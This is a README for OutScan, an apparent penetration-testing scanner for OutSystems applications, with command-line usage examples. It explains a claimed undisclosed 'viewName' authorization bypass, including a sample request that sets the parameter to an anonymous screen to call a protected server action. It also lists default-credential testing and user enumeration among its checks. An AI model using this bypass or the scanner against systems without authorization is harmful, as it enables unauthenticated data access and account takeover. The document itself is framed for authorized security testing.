# OutScan

```
 ██████╗ ██╗   ██╗████████╗███████╗ ██████╗ █████╗ ███╗   ██╗
██╔═══██╗██║   ██║╚══██╔══╝██╔════╝██╔════╝██╔══██╗████╗  ██║
██║   ██║██║   ██║   ██║   ███████╗██║     ███████║██╔██╗ ██║
██║   ██║██║   ██║   ██║   ╚════██║██║     ██╔══██║██║╚██╗██║
╚██████╔╝╚██████╔╝   ██║   ███████║╚██████╗██║  ██║██║ ╚████║
 ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝

  OutSystems Platform Security Scanner
  By Adrian Martinez | HAAK Cybersecurity
  Based on original 0-day research
```

**The first security scanner built specifically for OutSystems applications.**

OutScan detects platform-level vulnerabilities in OutSystems 11.x and ODC applications, including the **viewName authorization bypass (CVE pending)**, model.js entity schema exposure, admin panel exposure, and configuration weaknesses. Based on original 0-day research from real penetration testing engagements.

---

## Why OutScan?

OutSystems is used by thousands of enterprises worldwide, but there are **zero security tools** specifically designed to test it. Traditional scanners miss platform-specific vulnerabilities because they don't understand OutSystems architecture:

- **Screen-level authorization** — OutSystems enforces auth at the Screen level, not Server Action level
- **screenservices API** — Client-controlled parameters like `viewName` can bypass authorization
- **model.js exposure** — Auto-generated files expose full database schemas
- **Reactive Web architecture** — Client-side routing creates unique attack surfaces

OutScan understands these patterns and tests for them automatically.

---

## Features

### Modules

#### Fingerprint
- OutSystems platform detection (headers, cookies, HTML patterns, JS references)
- Version extraction (11.x, ODC)
- Server stack identification (IIS, .NET, Java)
- Environment detection (Dev/QA/Pre-Prod/Production)
- Module/application discovery

#### viewName Authorization Bypass (0-day)
- Discover anonymous screens usable for bypass
- Enumerate server actions accessible via viewName manipulation
- Verify data exposure through bypassed actions
- Test cross-module boundary enforcement
- Detect ATO (Account Takeover) chains
- **CWE-863: Incorrect Authorization**

#### model.js Schema Extraction
- Discover and parse model.js files across modules
- Extract entity names, field names, field types, relationships
- Detect sensitive entities (User, Password, OIDC, Payment)
- Identify exposed secrets (ClientSecret, PrivateKey, password hashes)
- Map data exposure scope per module
- **CWE-200: Information Exposure**

#### Screen & Action Enumeration
- Screen discovery via HTML/JS analysis
- Server action enumeration with response analysis
- Input parameter discovery from error messages
- REST API endpoint detection
- Swagger/OpenAPI spec discovery

#### Admin Panel Exposure
- ServiceCenter accessibility check
- LifeTime management console exposure
- Users module exposure
- IdP/Identity Provider exposure
- Default credential testing
- User enumeration via login response differences
- Monitoring/logging endpoint exposure

#### Configuration Audit
- Security headers (HSTS, CSP, X-Frame-Options, etc.)
- Cookie security (HttpOnly, Secure, SameSite)
- CORS misconfiguration on screenservice endpoints
- CSRF token enforcement
- Error handling (verbose stack traces)
- Rate limiting on authentication endpoints
- Debug mode detection

---

## Quick Start

```bash
git clone https://github.com/Bl4ckSkul1/outscan.git
cd outscan
pip install requests
```

### Basic Usage

```bash
# Quick scan (fingerprint + exposure)
python outscan.py -u https://target.outsystemscloud.com

# Full scan (all modules)
python outscan.py -u https://target.com --all

# Deep scan (extended enumeration)
python outscan.py -u https://target.com --deep

# viewName bypass test only
python outscan.py -u https://target.com --viewname

# model.js analysis only
python outscan.py -u https://target.com --model-js

# Test specific module
python outscan.py -u https://target.com --module-name Dashboard --viewname
```

### With Authentication

```bash
# Test as authenticated user (to compare auth vs unauth)
python outscan.py -u https://target.com --all \
  -c "ASP.NET_SessionId=abc123; osVisitor=xyz"

# With specific viewName value
python outscan.py -u https://target.com --viewname \
  --viewname-value "Common.UserResetPassword"
```

### Reports

```bash
# JSON + HTML report
python outscan.py -u https://target.com --all \
  -o results.json --html report.html --engagement HAAK-2026-005
```

---

## All Options

```
python outscan.py [options]

TARGET:
  -u, --url URL           Target OutSystems URL
  -L, --list FILE         File with target URLs

MODULES:
  --all                   Run all modules
  --deep                  Deep scan with extended enumeration
  --modules LIST          Comma-separated module names
  --fingerprint           Platform detection only
  --viewname              viewName auth bypass (0-day)
  --model-js              model.js schema extraction
  --screens               Screen & action enumeration
  --exposure              Admin panel exposure
  --config                Configuration audit

OUTSYSTEMS-SPECIFIC:
  --module-name NAME      Specific OutSystems module to test
  --viewname-value VALUE  Specific viewName for bypass testing

AUTHENTICATION:
  -c, --cookie COOKIE     Session cookies
  -t, --token TOKEN       Auth token
  -H, --header HEADER     Custom header (repeatable)

CONNECTION:
  --proxy URL             HTTP proxy (e.g., http://127.0.0.1:8080)
  --delay SECONDS         Delay between requests (default: 0.5)
  --timeout SECONDS       Request timeout (default: 15)

OUTPUT:
  -o, --output FILE       JSON report
  --html FILE             HTML report
  --engagement ID         Engagement ID
  -q, --quiet             Minimal output
```

---

## The viewName Bypass — How It Works

OutSystems Reactive Web applications use `screenservices` for server-client communication. The request includes a `viewName` parameter that determines the authorization context:

```
POST /Module/screenservices/Module/GetUserByEmail HTTP/1.1
Content-Type: application/json

{
  "versionInfo": {"moduleVersion": "..."},
  "viewName": "Common.UserResetPassword",    ← ATTACKER CONTROLLED
  "inputParameters": {"Email": "victim@target.com"}
}
```

If `viewName` points to an **anonymous screen** (like `Login` or `UserResetPassword`), the platform skips authentication for the server action — even if that action should require auth.

**Impact:** Unauthenticated access to server actions → data exposure, account takeover, privilege escalation.

**Affected:** OutSystems Platform Server 11.x, Reactive Web applications.

---

## Pipeline Integration

```bash
# AttackMap → OutScan: scan discovered OutSystems hosts
python outscan.py -u https://outsystems-target.com --all -o os_results.json

# OutScan → HaakAuth: test auth on discovered endpoints
python haakauth.py -u https://target.com/Module/screenservices/Module/Action \
  -t "Bearer token" --all

# OutScan → HaakJS: analyze OutSystems JS bundles
python haakjs.py -u https://target.com --secrets-only
```

---

## Project Structure

```
outscan/
├── outscan.py                         # Entry point
├── outscan_report.py                  # HTML report generator
├── README.md
├── requirements.txt
├── setup.py
├── LICENSE
├── .gitignore
└── os_scanner/
    ├── __init__.py
    ├── main.py                        # CLI orchestrator
    ├── core.py                        # OutSystemsTester, Finding, BaseModule
    ├── colors.py                      # Terminal output
    ├── data/
    │   ├── __init__.py
    │   └── os_common.py               # Module names, screens, actions, fingerprints
    └── modules/
        ├── __init__.py
        ├── fingerprint.py             # Platform detection
        ├── viewname_bypass.py         # 0-day auth bypass
        ├── model_js.py                # Schema extraction
        ├── screen_enum.py             # Screen/action enumeration
        ├── exposure.py                # Admin panel exposure
        └── config_audit.py            # Configuration audit
```

---

## Known CVEs & Research

OutScan tests for known OutSystems CVEs and platform-level vulnerabilities. See `os_scanner/data/os_cves.py` for the full database.

---

## Requirements

- Python 3.10+
- `requests` (only external dependency)

---

## Author

**Adrian Martinez** — Pentester & COO at HAAK Cybersecurity Consulting

- me@adrianmartinez.lat
- [@adrian.offsec](https://instagram.com/adrian.offsec)
- [@haakconsulting](https://instagram.com/haakconsulting)

---

## Responsible Disclosure

The viewName authorization bypass vulnerability is currently under responsible disclosure. CVE submission pending. This tool is released for authorized security testing only.

---

## License

MIT License — see [LICENSE](LICENSE) for details.

---

## Disclaimer

This tool is for **authorized security testing only**. Only use against systems where you have explicit written permission. Unauthorized use may be illegal. The authors are not responsible for misuse of this tool.
